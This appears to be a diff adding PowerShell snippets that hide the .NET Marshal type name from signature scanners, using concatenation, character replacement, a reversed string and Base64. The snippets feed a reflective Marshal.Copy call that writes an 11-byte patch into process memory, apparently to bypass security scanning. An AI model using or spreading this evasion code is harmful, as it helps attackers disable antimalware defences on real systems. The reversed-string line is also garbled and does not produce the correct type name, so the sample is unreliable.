@@ -1,3 +1,18 @@
+# String concat
+$new = [System.Type]::GetType("System.Runtime.InteropServices" + ".Marshal")
+
+# String split/join
+$str = "System-Runtime-InteropServices-Marshal"
+$new = [System.Type]::GetType($str.Replace("-", "."))
+
+# Reverse string
+$rev = "lahsraM.secivreSporetniretnimuR.metsyS"
+$new = [System.Type]::GetType((-join $rev[-1..-$rev.Length]))
+
+# Base64 encoded
+$b64 = [Convert]::FromBase64String("U3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWw=")
+$new = [System.Type]::GetType([System.Text.Encoding]::UTF8.GetString($b64))
+
 # Using reflection to invoke Copy
 $new.GetMethod("Copy", [type[]]([byte[]], [int], [IntPtr], [int])).Invoke($null, @($Patch, 0, $Address, 11))
 
